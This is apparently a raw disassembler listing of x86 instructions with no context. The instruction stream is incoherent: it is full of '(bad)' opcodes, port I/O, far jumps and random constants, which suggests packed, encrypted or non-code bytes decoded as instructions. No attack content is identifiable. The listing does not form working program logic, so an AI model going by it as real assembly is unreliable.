  414e37:	mov    WORD PTR [ecx*4+0x782c927a],ds
  414e3e:	jmp    0x414e6d
  414e40:	xor    BYTE PTR [ebx+0x49fb7869],ah
  414e46:	sub    DWORD PTR [ebp+0x5b],ecx
  414e49:	cmp    ebx,ebp
  414e4b:	out    dx,eax
  414e4c:	xchg   ecx,eax
  414e4d:	jmp    0x414ec2
  414e4f:	pusha  
  414e50:	aam    0x24
  414e52:	mov    ecx,0xa5142ec4
  414e57:	pop    ds
  414e58:	push   ebx
  414e59:	cs dec edx
  414e5b:	mov    BYTE PTR [edi],dh
  414e5d:	lods   al,BYTE PTR ds:[esi]
  414e5e:	fs in  eax,dx
  414e60:	and    eax,eax
  414e62:	stos   DWORD PTR es:[edi],eax
  414e63:	xchg   DWORD PTR [eax-0x66e5bb5a],ecx
  414e69:	aad    0x84
  414e6b:	inc    esi
  414e6c:	push   esi
  414e6d:	mov    dl,0xed
  414e6f:	xchg   esp,eax
  414e70:	xor    DWORD PTR [esi+0x57f67b2d],ebx
  414e76:	stos   DWORD PTR es:[edi],eax
  414e77:	sbb    eax,0xf1fc7559
  414e7c:	inc    ecx
  414e7d:	mov    edx,0x4dd4a7c9
  414e82:	lock xchg ebx,eax
  414e84:	ret    
  414e85:	sbb    bl,BYTE PTR [edi+0x4b]
  414e88:	std    
  414e89:	repz jmp 0x414e74
  414e8c:	dec    edx
  414e8d:	ja     0x414ec1
  414e8f:	adc    al,0xed
  414e91:	push   edx
  414e92:	sub    BYTE PTR [edi],ah
  414e94:	xor    DWORD PTR [ebp-0x18],ebx
  414e97:	push   eax
  414e98:	dec    esp
  414e99:	loope  0x414e8b
  414e9b:	sub    eax,0x2258eb7f
  414ea0:	xor    ecx,DWORD PTR [edx+eax*2+0x53629a6e]
  414ea7:	ds fcomp st(4)
  414eaa:	cld    
  414eab:	dec    ebp
  414eac:	dec    ecx
  414ead:	bound  edx,QWORD PTR [ecx]
  414eaf:	iret   
  414eb0:	push   cs
  414eb1:	jb     0x414ef1
  414eb3:	mov    ds:0xaad9cef3,eax
  414eb8:	mov    eax,ds:0x93b21b64
  414ebd:	or     ah,BYTE PTR [eax+0x65]
  414ec0:	mov    edi,0x248a1b1b
  414ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec6:	mov    ah,0x94
  414ec8:	dec    esp
  414ec9:	mov    edx,0x75c64295
  414ece:	mov    ah,0x44
  414ed1:	(bad)  
  414ed2:	clc    
  414ed3:	in     al,dx
  414ed4:	xchg   edx,eax
  414ed5:	std    
  414ed6:	xchg   ecx,eax
  414ed7:	data16 in al,0xd6
  414eda:	mov    esi,0xe7cea5bb
  414edf:	outs   dx,DWORD PTR ds:[esi]
  414ee0:	lds    esp,FWORD PTR [ebx]
  414ee2:	mov    al,ds:0x50b6265b
  414ee7:	test   BYTE PTR [ebx-0x70],bh
  414eea:	or     DWORD PTR [eax],eax
  414eec:	aad    0x39
  414eee:	dec    ecx
  414eef:	jne    0x414ef9
  414ef1:	fidivr DWORD PTR [edx]
  414ef3:	mov    esp,?
  414ef5:	or     eax,ebx
  414ef7:	pop    ecx
  414ef8:	xadd   DWORD PTR [esi],edi
  414efb:	cmp    BYTE PTR [edi+edx*2+0x79],dl
  414eff:	mov    esp,0x8bac2454
  414f04:	icebp  
  414f05:	pop    esp
  414f06:	sub    edi,DWORD PTR [esp+eiz*2+0xe]
  414f0a:	jecxz  0x414f7c
  414f0c:	imul   edx,DWORD PTR [eax+0x2e],0x4b
  414f10:	scas   al,BYTE PTR es:[edi]
  414f11:	aad    0x6f
  414f13:	adc    ch,BYTE PTR [esi+eiz*8]
  414f16:	dec    eax
  414f17:	sub    eax,0xa5989801
  414f1c:	jmp    0xca81:0xa30eb3d8
  414f23:	dec    esi
  414f24:	xchg   edi,eax
  414f25:	data16 int 0x56
  414f28:	and    al,0x49
  414f2a:	aad    0x73
  414f2c:	in     al,dx
  414f2d:	sub    eax,0x52c81af8
  414f32:	xchg   ecx,eax
  414f33:	inc    edi
  414f34:	adc    eax,0x8a527405
  414f39:	cmp    eax,eax
  414f3b:	pop    es
  414f3c:	mov    esp,DWORD PTR [ebp-0x39]
  414f3f:	rcl    edi,cl
  414f41:	or     al,BYTE PTR [eax]
  414f43:	and    dh,BYTE PTR [eax]
  414f45:	pop    edi
  414f46:	ins    DWORD PTR es:[edi],dx
  414f47:	(bad)  
  414f48:	mov    cl,0xb1
  414f4a:	pop    ebx
  414f4b:	ficom  WORD PTR [edx+0x2e40fc28]
  414f51:	jg     0x414f90
  414f53:	js     0x414fcd
  414f55:	nop
  414f56:	es cwde 
  414f58:	scas   eax,DWORD PTR es:[edi]
  414f59:	(bad)  
  414f5b:	mov    al,0xaf
  414f5d:	stc    
  414f5e:	and    DWORD PTR [esp+edi*4+0x7b],0xffffffa6
  414f63:	out    0xd3,eax
  414f65:	sbb    BYTE PTR [edx],0x27
  414f68:	sbb    cl,0x5c
  414f6b:	aas    
  414f6c:	stos   BYTE PTR es:[edi],al
  414f6d:	jg     0x414f9d
  414f6f:	out    dx,eax
  414f70:	jb     0x414fee
  414f72:	inc    esi
  414f73:	sub    DWORD PTR [esi-0x31],ecx
  414f76:	aas    
  414f77:	iret   
  414f78:	xor    eax,0x2f378662
  414f7d:	mov    ds:0x14c2e56,eax
  414f82:	adc    DWORD PTR [ecx-0x4fb9df84],eax
  414f88:	nop
  414f89:	or     ecx,DWORD PTR [edx]
  414f8b:	fdivr  QWORD PTR [esi-0x629d4d39]
  414f91:	cmp    eax,0xb1fcc3c3
  414f96:	jb     0x414f67
  414f98:	push   ds
  414f99:	adc    ah,ch
  414f9b:	mov    ch,0xfa
  414f9d:	xchg   DWORD PTR [eax],ecx
  414f9f:	xchg   edx,eax
  414fa0:	in     al,dx
  414fa1:	pusha  
  414fa2:	mul    BYTE PTR [edi+ecx*4]
  414fa5:	outs   dx,DWORD PTR ds:[esi]
  414fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa7:	inc    eax
  414fa8:	outs   dx,DWORD PTR ds:[esi]
  414fa9:	or     esp,DWORD PTR [ebx-0x722f52d7]
  414faf:	adc    dh,BYTE PTR [esi-0x61]
  414fb2:	inc    ebx
  414fb3:	nop
  414fb4:	pop    ecx
  414fb5:	mov    bh,dh
  414fb7:	lock jmp 0x5254:0xb6712db9
  414fbf:	sub    ah,bh
  414fc1:	leave  
  414fc2:	out    dx,al
  414fc3:	popf   
  414fc4:	or     DWORD PTR [esi+0x4877f9d3],ebx
  414fca:	adc    bl,ah
  414fcc:	xchg   bl,dl
  414fce:	setnp  bl
  414fd1:	and    DWORD PTR [ebp-0x2042db38],0x10
  414fd8:	inc    eax
  414fd9:	and    ebx,DWORD PTR [ecx+0x17e24b99]
  414fdf:	mov    edx,0x6aa7a508
  414fe4:	push   ebp
  414fe5:	push   cs
  414fe6:	mov    bh,0x79
  414fe8:	jae    0x414fb4
  414fea:	js     0x414f8d
  414fec:	add    eax,0xa16ae964
  414ff1:	mov    ebx,0x46ce181f
  414ff6:	inc    eax
  414ff7:	int3   
  414ff8:	fs mov dl,0xe6
  414ffb:	jo     0x41503e
  414ffd:	jo     0x415012
  414fff:	das    
  415000:	aam    0x7a
  415002:	mul    DWORD PTR ds:0x406dec4d
  415008:	add    al,BYTE PTR [ebx-0x46c67188]
  41500e:	mov    edx,0x15daf86e
  415013:	mov    eax,ds:0x6f68998a
  415018:	dec    edx
  415019:	push   ds
  41501a:	pop    edi
  41501b:	dec    eax
  41501c:	mov    edx,0x81bdb06f
  415021:	xor    esi,DWORD PTR [ebx+0x69]
  415024:	push   ecx
  415025:	js     0x415089
  415027:	aaa    
  415028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415029:	mov    edi,0x23600bd4
  41502e:	shl    BYTE PTR [ebp-0x6cafa9d6],0xc4
  415035:	div    edi
  415037:	jecxz  0x414fd6
  415039:	mov    dh,0x2a
  41503b:	fld    st(3)
  41503d:	push   cs
  41503e:	sbb    DWORD PTR [esi],0xffffffa7
  415041:	outs   dx,BYTE PTR ds:[esi]
  415042:	jo     0x415002
  415044:	sbb    eax,0x7a0fe204
  415049:	sbb    BYTE PTR [eax-0x7],al
  41504c:	pop    eax
  41504d:	mov    edx,0xfde3a617
  415052:	aam    0xd
  415054:	enter  0x5976,0x4c
  415058:	jae    0x415077
  41505a:	add    DWORD PTR [edi+0x6a],eax
  41505d:	arpl   WORD PTR [ecx-0x56],ax
  415060:	mov    WORD PTR [esi+0x21],cs
  415063:	xchg   ebp,eax
  415064:	add    al,0xb5
  415066:	mov    ebx,0x6416f49
  41506b:	mov    ebx,0x59aba5ad
  415070:	jno    0x4150b5
  415072:	adc    DWORD PTR [edi],esi
  415074:	jg     0x415076
  415076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415077:	add    DWORD PTR [eax-0x6],0x7a
  41507b:	cld    
  41507c:	pusha  
  41507d:	mov    bl,ch
  41507f:	stos   BYTE PTR es:[edi],al
  415080:	add    DWORD PTR [ebx-0x3a821770],esp
  415086:	xlat   BYTE PTR ds:[ebx]
  415087:	cmp    al,0x1f
  415089:	mov    edx,0x6feb4e2b
  41508e:	push   eax
  41508f:	and    al,0x70
  415091:	cwde   
  415092:	sahf   
  415093:	jae    0x4150b4
  415095:	shl    DWORD PTR [ebx+esi*1],cl
  415098:	pop    ecx
  415099:	mov    ch,0x24
  41509b:	dec    ebp
  41509c:	cmp    DWORD PTR [eax],ecx
  41509e:	xor    DWORD PTR [edx-0x63],ecx
  4150a1:	push   edx
  4150a2:	mov    edx,0x2e254daf
  4150a7:	mov    edi,0xfa01fe61
  4150ac:	je     0x4150ef
  4150ae:	sub    al,0xc8
  4150b0:	popa   
  4150b1:	mov    ds:0x971069de,eax
  4150b6:	xchg   edi,eax
  4150b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150b8:	fist   DWORD PTR [eax-0x4]
  4150bb:	adc    esp,DWORD PTR [ebp+esi*2+0x5dea8f10]
  4150c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150c3:	in     eax,0x66
  4150c5:	hlt    
  4150c6:	sbb    DWORD PTR [edi-0x4b],esp
  4150c9:	or     eax,0xd69e0ba
  4150ce:	cdq    
  4150cf:	inc    ebp
  4150d0:	les    ebx,FWORD PTR [edi-0x46513dd1]
  4150d6:	push   esp
  4150d7:	xor    ebp,DWORD PTR [edi+0x5620544e]
  4150dd:	xchg   esi,eax
  4150de:	xchg   ebx,eax
  4150df:	pop    ss
  4150e0:	jg     0x41506f
  4150e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e3:	dec    esi
  4150e4:	mov    eax,ds:0x225cff71
  4150e9:	(bad)  
  4150ea:	hlt    
  4150eb:	mov    eax,0x8ef53d7
  4150f0:	sar    ecx,0x31
  4150f3:	jp     0x41507a
  4150f5:	add    dl,BYTE PTR [ebx]
  4150f7:	pusha  
  4150f8:	sbb    DWORD PTR ds:0x1280c8ca,esi
  4150fe:	imul   ebp,ebp,0xe9e958e1
  415104:	mul    ah
  415106:	test   bh,al
  415108:	aam    0xc5
  41510a:	fbld   TBYTE PTR [edi*1+0x40cec1c2]
  415111:	(bad)  
  415112:	out    dx,al
  415113:	shl    ebp,0xdc
  415116:	shl    esi,cl
  415118:	sbb    eax,0x9916983f
  41511d:	sahf   
  41511e:	addr16 dec eax
  415120:	sbb    edi,DWORD PTR [edi-0x4e]
  415123:	jecxz  0x4150f2
  415125:	mov    bl,0xba
  415127:	jl     0x415148
  415129:	cmc    
  41512a:	mov    DWORD PTR [ecx+esi*1],0x53ed2af
  415131:	pushf  
  415132:	pop    esi
  415133:	nop
  415134:	lods   eax,DWORD PTR ds:[esi]
  415135:	les    edi,FWORD PTR [edi-0x7804a319]
  41513b:	popa   
  41513c:	add    al,0x4c
  41513e:	xor    DWORD PTR [eax-0x50],ebx
  415141:	xlat   BYTE PTR ds:[ebx]
  415142:	dec    esi
  415143:	jmp    0x3475:0x37160c65
  41514a:	adc    al,0x6b
  41514c:	icebp  
  41514d:	xchg   ebp,eax
  41514e:	out    dx,al
  41514f:	imul   esp,DWORD PTR [ebp-0x1c676c88],0x5fe35b80
  415159:	in     eax,dx
  41515a:	call   0x695:0x76732560
  415161:	lods   al,BYTE PTR ds:[esi]
  415162:	inc    ecx
  415163:	shl    bl,1
  415165:	mov    dl,0x47
  415167:	es mov ebp,0xe4df391a
  41516d:	xchg   bl,ch
  41516f:	mov    esi,0x9b292253
  415174:	push   ebx
  415175:	dec    ecx
  415176:	es sub al,0xd5
  415179:	js     0x4151f2
  41517b:	xor    ah,BYTE PTR [ebp+0x57071fc7]
  415181:	das    
  415182:	pusha  
  415183:	out    dx,eax
  415184:	sbb    bl,0x4
  415187:	cwde   
  415188:	test   eax,0xb029fdef
  41518d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41518f:	daa    
  415190:	cwde   
  415191:	stos   BYTE PTR es:[edi],al
  415192:	lock and BYTE PTR [ebp+ebx*8+0xe],ah
  415197:	hlt    
  415198:	sbb    DWORD PTR [ebp-0x1f],0xc990425c
  41519f:	pop    edi
  4151a0:	pop    edi
  4151a1:	adc    esi,esi
  4151a3:	shl    DWORD PTR [esi-0x24],0x2
  4151a7:	mov    WORD PTR [eax+0x59],?
  4151aa:	es repz push ss
  4151ad:	lods   al,BYTE PTR ds:[esi]
  4151ae:	mov    esp,0xc573f2b3
  4151b3:	jl     0x415208
  4151b5:	or     eax,0x209ede3b
  4151ba:	stc    
  4151bb:	aas    
  4151bc:	or     eax,0x8a6b15b5
  4151c1:	adc    BYTE PTR [ebx-0x6c],bh
  4151c4:	stos   DWORD PTR es:[edi],eax
  4151c5:	ins    DWORD PTR es:[edi],dx
  4151c6:	fild   QWORD PTR [eax-0x3f8c28af]
  4151cc:	push   esp
  4151cd:	adc    BYTE PTR [edi-0x55bef43c],bl
  4151d3:	aaa    
  4151d4:	out    0x39,al
  4151d6:	push   ebx
  4151d7:	push   esp
  4151d8:	xchg   DWORD PTR [ecx+0x547a1f39],edx
  4151de:	pop    ebp
  4151df:	aam    0x18
  4151e1:	mov    WORD PTR [ecx],gs
  4151e3:	dec    ecx
  4151e4:	fistp  WORD PTR [eax-0x38]
  4151e7:	sub    al,ah
  4151e9:	push   ds
  4151ea:	sbb    eax,0xa6234366
  4151ef:	aas    
  4151f0:	shr    DWORD PTR [edi-0x1],0x57
  4151f4:	cmp    cl,al
  4151f6:	cmp    cl,BYTE PTR [ebx-0x36]
  4151f9:	jle    0x4151a3
  4151fb:	(bad)  
  4151fc:	test   eax,0x2a510006
  415201:	adc    al,cl
  415203:	sub    DWORD PTR [edi],ebx
  415205:	and    dl,BYTE PTR [ebx]
  415207:	(bad)  
  415208:	dec    ebx
  415209:	push   0xffffffe8
  41520b:	fyl2xp1 
  41520d:	je     0x4151ed
  41520f:	(bad)  
  415210:	mov    ebx,0x96083341
  415215:	jle    0x4151e8
  415217:	add    ebp,DWORD PTR [ecx]
  415219:	scas   al,BYTE PTR es:[edi]
  41521a:	pop    esp
  41521b:	mov    ch,bh
  41521d:	push   esi
  41521e:	inc    edx
  41521f:	adc    DWORD PTR [esp+eax*1],ebp
  415222:	popf   
  415223:	retf   
  415224:	adc    esp,DWORD PTR [ebx+eax*4+0x75]
  415228:	xor    eax,0x28
  41522b:	xchg   esp,eax
  41522c:	xor    al,0x88
  41522e:	push   ecx
  41522f:	sub    al,0xc8
  415231:	mov    BYTE PTR [ecx-0x548a4388],dl
  415237:	mov    DWORD PTR [esi+0x4797366],0x56c60226
  415241:	pop    ebp
  415242:	inc    esp
  415243:	ret    0x7d2b
  415246:	inc    edi
  415247:	inc    edi
  415248:	je     0x4151de
  41524a:	pop    ss
  41524b:	inc    ebx
  41524c:	dec    esi
  41524d:	or     al,0x5c
  41524f:	dec    ecx
  415250:	jnp    0x415293
  415252:	or     dl,bh
  415254:	sar    BYTE PTR [edx],0x58
  415257:	scas   eax,DWORD PTR es:[edi]
  415258:	imul   ebx,DWORD PTR [edx],0x2a
  41525b:	daa    
  41525c:	popa   
  41525d:	out    0x7e,eax
  41525f:	fldcw  WORD PTR [esp+ebx*4+0x10dee55d]
  415266:	aas    
  415267:	adc    dh,BYTE PTR [esi]
  415269:	mov    eax,ds:0xc9ebd2d8
  41526e:	ins    DWORD PTR es:[edi],dx
  41526f:	add    DWORD PTR [ebx+0x1d],edx
  415272:	cmc    
  415273:	stc    
  415274:	inc    ecx
  415275:	jbe    0x4152d3
  415277:	xlat   BYTE PTR ds:[ebx]
  415278:	push   ds
  415279:	xchg   esp,eax
  41527a:	xlat   BYTE PTR ds:[ebx]
  41527b:	mov    edi,0x67dd487c
  415280:	jno    0x41529e
  415282:	pushf  
  415283:	test   DWORD PTR [ecx],eax
  415285:	pusha  
  415286:	adc    eax,DWORD PTR ds:0xec7e2bcc
  41528c:	inc    edi
  41528d:	les    ecx,FWORD PTR [esp]
  415290:	mov    dl,0x1d
  415292:	xchg   edi,eax
  415293:	sbb    bl,BYTE PTR [esi+0x1551907f]
  415299:	jmp    FWORD PTR [edx+0xa34c765]
  41529f:	(bad)  
  4152a0:	dec    edx
  4152a1:	mov    eax,0x27c17864
  4152a6:	jg     0x415237
  4152a8:	adc    al,0x4b
  4152aa:	mov    ds:0xb6dc4621,eax
  4152af:	dec    eax
  4152b0:	sbb    DWORD PTR ds:0xcf97a0f0,edi
  4152b6:	sahf   
  4152b7:	enter  0x7761,0xe8
  4152bb:	sub    esi,esi
  4152bd:	adc    dh,al
  4152bf:	jl     0x4152e1
  4152c1:	pop    edi
  4152c2:	fidivr WORD PTR [esi+0x7da53830]
  4152c8:	xor    DWORD PTR [ebp-0x2b5319c3],ecx
  4152ce:	jmp    0x7693:0x4f8edf3b
  4152d5:	pop    ds
  4152d6:	sub    ah,bh
  4152d8:	xor    eax,0xe8289b9
  4152dd:	cmp    al,BYTE PTR [ebx]
  4152df:	aad    0xb8
  4152e1:	das    
  4152e2:	mov    ds,WORD PTR [edx+0x4fde72f3]
  4152e8:	mov    ebx,0xa7121376
  4152ed:	dec    ax
  4152ef:	dec    ecx
  4152f0:	sub    ebp,eax
  4152f2:	rcr    ebx,0x2b
  4152f5:	pop    edx
  4152f6:	push   cs
  4152f7:	nop
  4152f8:	dec    esp
  4152f9:	or     BYTE PTR [eax+0x41e34ad4],bh
  4152ff:	or     eax,0x1a27d34b
  415304:	push   esi
  415305:	ror    ch,cl
  415307:	xchg   ecx,edx
  415309:	mov    ah,dl
  41530b:	sub    DWORD PTR [ebp-0x600c6f80],ebp
  415311:	pop    esi
  415312:	sbb    ebp,ebx
  415314:	imul   ebp,DWORD PTR [eax],0x11ae35e1
  41531a:	or     al,0xf1
  41531c:	leave  
  41531d:	xchg   edx,eax
  41531e:	cmp    eax,0x1c1b7dcc
  415323:	and    al,0xa1
  415325:	loop   0x415327
  415327:	add    bl,BYTE PTR ds:0x42717bbc
  41532d:	pushf  
  41532e:	je     0x41530e
  415330:	mul    DWORD PTR [edi+0x5eda7bc3]
  415336:	xchg   ebp,eax
  415337:	add    al,0xc8
  415339:	(bad)  
  41533a:	arpl   WORD PTR [esi+0x14],cx
  41533d:	in     al,0xa4
  41533f:	or     BYTE PTR [ebx],bl
  415341:	ficomp DWORD PTR [ecx-0x22]
  415344:	xor    ah,BYTE PTR [ecx+0x3c]
  415347:	mov    ebx,fs
  415349:	push   0x89ab2a45
  41534e:	jnp    0x41532e
  415350:	js     0x41536a
  415352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415353:	or     edi,eax
  415355:	addr16 sub dh,dh
  415358:	in     al,dx
  415359:	mov    edi,0xe8d36baf
  41535e:	call   0xba4:0xe1c617ee
  415365:	jae    0x41536d
  415367:	fwait
  415368:	dec    esp
  415369:	mov    BYTE PTR [esi+eax*2-0x43],cl
  41536d:	std    
  41536e:	and    dl,bh
  415370:	pop    edx
  415371:	xor    esi,DWORD PTR ds:0x5897993d
  415377:	or     ah,bh
  415379:	out    0xba,al
  41537b:	and    DWORD PTR [ebx],ecx
  41537d:	xor    eax,0x76e7e2fc
  415382:	mov    WORD PTR [ebx],es
  415384:	dec    ecx
  415385:	lods   eax,DWORD PTR ds:[esi]
  415386:	and    esp,DWORD PTR [ebx]
  415388:	mov    bh,al
  41538a:	mov    esi,0x54c5cec
  41538f:	out    dx,eax
  415390:	out    0xad,eax
  415392:	push   eax
  415393:	rcr    DWORD PTR [ebp+0x50],0x51
  415397:	cmp    eax,0x181f494
  41539c:	popa   
  41539d:	cmp    ebx,DWORD PTR [ebx+0x3f]
  4153a0:	xor    al,ch
  4153a2:	or     BYTE PTR [edx+0x2c41c3b6],ch
  4153a8:	leave  
  4153a9:	push   cs
  4153aa:	cdq    
  4153ab:	sbb    eax,0xf02ed284
  4153b0:	call   0x25e1fa15
  4153b5:	stc    
  4153b6:	dec    edi
  4153b7:	pop    edi
  4153b8:	or     BYTE PTR [ebp+0x4cb2f642],dh
  4153be:	into   
  4153bf:	(bad)  
  4153c0:	push   cs
  4153c1:	push   esi
  4153c2:	xchg   DWORD PTR [edi+eax*2+0x45bfb503],ebp
  4153c9:	sahf   
  4153ca:	pop    ss
  4153cb:	adc    DWORD PTR [ebx],esi
  4153cd:	adc    al,0xd6
  4153cf:	mov    ebx,esi
  4153d1:	push   eax
  4153d2:	cmp    al,0x10
  4153d4:	pop    ecx
  4153d5:	cmp    esi,DWORD PTR [ecx]
  4153d7:	mov    ebx,0x76a45090
  4153dc:	ret    0x41f
  4153df:	inc    ebp
  4153e0:	fucomip st,st(5)
  4153e2:	rcl    BYTE PTR [ecx+0x4f21d457],0x7a
  4153e9:	popa   
  4153ea:	mov    DWORD PTR [ecx],eax
  4153ec:	outs   dx,BYTE PTR ds:[esi]
  4153ed:	push   0xffffffb7
  4153ef:	adc    bl,bl
  4153f1:	iret   
  4153f2:	push   edx
  4153f3:	mov    BYTE PTR [eax],al
  4153f5:	inc    ebx
  4153f6:	jmp    0x27f7c47e
  4153fb:	xchg   esp,eax
  4153fc:	fnstcw WORD PTR [edi-0x74cc5cff]
  415402:	div    ecx
  415404:	push   ebp
  415405:	pop    esp
  415406:	icebp  
  415407:	inc    eax
  415408:	daa    
  415409:	in     al,dx
  41540a:	cld    
  41540b:	enter  0x4bea,0xc6
  41540f:	pop    esi
  415410:	fiadd  WORD PTR [ebp+0x57]
  415413:	pop    es
  415414:	std    
  415415:	jae    0x4153bf
  415417:	pop    ebp
  415418:	jmp    0x381f315d
  41541d:	adc    al,BYTE PTR [eax-0x238b0610]
  415423:	lahf   
  415424:	adc    al,0xb6
  415426:	push   0xaf7295c1
  41542b:	ficomp DWORD PTR [edx]
  41542d:	adc    ecx,edx
  41542f:	es and al,0x43
  415432:	inc    ebp
  415433:	cmp    al,0x5d
  415435:	outs   dx,DWORD PTR ds:[esi]
  415436:	fist   DWORD PTR [esp+ebp*2]
  415439:	sub    BYTE PTR [eax-0x53654071],ch
  41543f:	or     bl,cl
  415441:	add    ecx,ebp
  415443:	stc    
  415444:	and    ebp,ecx
  415446:	sbb    eax,0xc0e27f8e
  41544b:	jo     0x415473
  41544d:	imul   edx
  41544f:	inc    ebx
  415450:	stos   DWORD PTR es:[edi],eax
  415451:	or     ah,BYTE PTR [edi+0x2fb228e1]
  415457:	cdq    
  415458:	dec    ebx
  415459:	xor    al,0x1c
  41545b:	inc    ecx
  41545c:	jo     0x415410
  41545e:	mov    eax,?
  415460:	ds pop esp
  415462:	jmp    0xe8ac:0x255226c1
  415469:	icebp  
  41546a:	out    dx,al
  41546b:	aaa    
  41546c:	xchg   ebp,eax
  41546d:	jg     0x41543d
  41546f:	out    dx,al
  415470:	mov    ?,WORD PTR [edi-0x6a]
  415473:	fist   WORD PTR [edx-0x7c]
  415476:	dec    ecx
  415477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415478:	ret    0xee7c
  41547b:	mov    ah,0x7c
  41547d:	pusha  
  41547e:	inc    edi
  41547f:	push   eax
  415480:	inc    edi
  415481:	out    dx,al
  415482:	loopne 0x41543a
  415484:	das    
  415485:	pop    ds
  415486:	adc    bh,BYTE PTR [edx+0x59]
  415489:	lods   eax,DWORD PTR ds:[esi]
  41548a:	mov    esi,0x3209fc9f
  41548f:	in     eax,dx
  415490:	pop    ss
  415491:	int3   
  415492:	stc    
  415493:	shl    BYTE PTR [esi],0x2e
  415496:	mov    al,0x71
  415498:	add    ch,dh
  41549a:	push   cs
  41549b:	pop    esp
  41549c:	sar    DWORD PTR [esp+ebp*1],cl
  41549f:	aaa    
  4154a0:	and    BYTE PTR [eax],bh
  4154a2:	and    eax,0xe8c423bf
  4154a7:	cwde   
  4154a8:	jo     0x41550c
  4154aa:	cmp    al,0xf6
  4154ac:	rol    al,0xd
  4154af:	mov    WORD PTR [eax],fs
  4154b1:	xchg   ebx,eax
  4154b2:	pop    ecx
  4154b3:	lds    eax,FWORD PTR [edi+0x40]
  4154b6:	loope  0x41552c
  4154b8:	mov    esp,0xc592c961
  4154bd:	loope  0x415506
  4154bf:	mov    ds:0x62b07972,eax
  4154c5:	lahf   
  4154c6:	or     DWORD PTR [ecx+0x57],edx
  4154c9:	sub    edi,esi
  4154cb:	outs   dx,BYTE PTR ds:[esi]
  4154cc:	push   es
  4154cd:	xchg   ebp,eax
  4154ce:	ds (bad) 
  4154d0:	out    dx,eax
  4154d1:	mov    cl,0xc9
  4154d3:	into   
  4154d4:	das    
  4154d5:	neg    eax
  4154d7:	push   ebx
  4154d8:	mov    al,ds:0xff7adcf6
  4154dd:	pushf  
  4154de:	mov    bl,0x7c
  4154e0:	cmc    
  4154e1:	retf   0x7c60
  4154e4:	cmc    
  4154e5:	jl     0x4154dc
  4154e7:	inc    edi
  4154e8:	ret    
  4154e9:	xor    DWORD PTR [ebp-0x31],eax
  4154ec:	push   esi
  4154ed:	out    0xb3,eax
  4154ef:	xor    dl,BYTE PTR [ebx-0x69]
  4154f2:	ins    BYTE PTR es:[edi],dx
  4154f3:	cmp    DWORD PTR [eax-0x2f],edx
  4154f6:	xor    BYTE PTR [edx+0x1e1b83d6],0x88
  4154fd:	sbb    eax,0x6eece8b
  415502:	pop    ebp
  415503:	add    BYTE PTR [ebx+ebx*4],ah
  415506:	aaa    
  415507:	sti    
  415508:	xor    BYTE PTR [esp+ebp*1-0x4a],dh
  41550c:	retf   
  41550d:	pop    ebx
  41550e:	or     cl,BYTE PTR [esi]
  415510:	sub    eax,0x73d55d1f
  415515:	das    
  415516:	cli    
  415517:	retf   
  415518:	mov    BYTE PTR [ebx-0x4f],ah
  41551b:	jge    0x415521
  41551d:	rcr    BYTE PTR [eax+0x53],1
  415520:	sbb    bl,dl
  415522:	jp     0x4154e2
  415524:	dec    eax
  415525:	mov    bl,0xd9
  415527:	mov    bh,bl
  415529:	leave  
  41552a:	in     al,dx
  41552b:	(bad)  
  41552c:	pop    ds
  41552d:	xchg   BYTE PTR [esi+0x2b],cl
  415530:	test   DWORD PTR [ebx],0x2d469766
  415536:	pop    ebp
  415537:	push   edx
  415538:	test   BYTE PTR [edi],cl
  41553a:	push   ebp
  41553b:	dec    ecx
  41553c:	inc    esi
  41553d:	test   BYTE PTR [ecx+edx*8+0x5b],0x57
  415542:	mov    gs,ebp
  415544:	imul   eax,DWORD PTR [ecx],0x76
  415547:	daa    
  415548:	push   ss
  415549:	pop    eax
  41554a:	in     al,dx
  41554b:	jecxz  0x415528
  41554d:	(bad)  
  41554e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41554f:	inc    eax
  415550:	outs   dx,DWORD PTR ds:[esi]
  415551:	ins    BYTE PTR es:[edi],dx
  415552:	xchg   esi,eax
  415553:	push   ebp
  415554:	inc    edx
  415555:	in     eax,dx
  415556:	dec    ebx
  415557:	loopne 0x41553e
  415559:	in     al,0x4a
  41555b:	cs loop 0x415514
  41555e:	and    al,0x4e
  415560:	add    DWORD PTR [ecx+0x7e6188bb],eax
  415566:	pop    ds
  415567:	mov    eax,ds:0x5e24c42b
  41556c:	dec    ebx
  41556d:	int    0x75
  41556f:	or     bl,BYTE PTR [edi]
  415571:	adc    eax,0x2d1acf5d
  415576:	pop    ecx
  415577:	fldcw  WORD PTR [edi+edi*1]
  41557a:	test   BYTE PTR [esi+0x4c],bh
  41557d:	sti    
  41557e:	dec    esp
  41557f:	inc    edi
  415580:	mov    eax,DWORD PTR [eax]
  415582:	fadd   DWORD PTR [edi+0x13bf46d0]
  415588:	in     eax,dx
  415589:	push   ebp
  41558a:	das    
  41558b:	pop    edi
  41558c:	mov    edi,DWORD PTR [esi+eiz*1]
  41558f:	(bad)  
  415590:	xor    al,BYTE PTR [esi-0x21db5c6f]
  415596:	mov    WORD PTR [esi],ss
  415598:	fidiv  WORD PTR [esp+edx*8+0x1e378627]
  41559f:	dec    edx
  4155a0:	mov    eax,ds:0x7dd0178e
  4155a5:	pop    edx
  4155a6:	xchg   ebp,eax
  4155a7:	push   0xffffff93
  4155a9:	popa   
  4155aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ab:	cmp    ebx,0xfae098f0
  4155b1:	or     eax,0xc7091e2b
  4155b6:	dec    ebp
  4155b7:	loopne 0x4155c7
  4155b9:	fsub   DWORD PTR ds:0x124c7643
  4155bf:	in     al,0xc6
  4155c1:	je     0x415545
  4155c3:	(bad)  
  4155c4:	lds    esi,FWORD PTR [esi]
  4155c6:	mov    WORD PTR ds:0x10c0ab9d,ds
  4155cc:	stos   DWORD PTR es:[edi],eax
  4155cd:	adc    bh,BYTE PTR ds:0x89113871
  4155d3:	mov    WORD PTR [edi-0x1c534a8f],fs
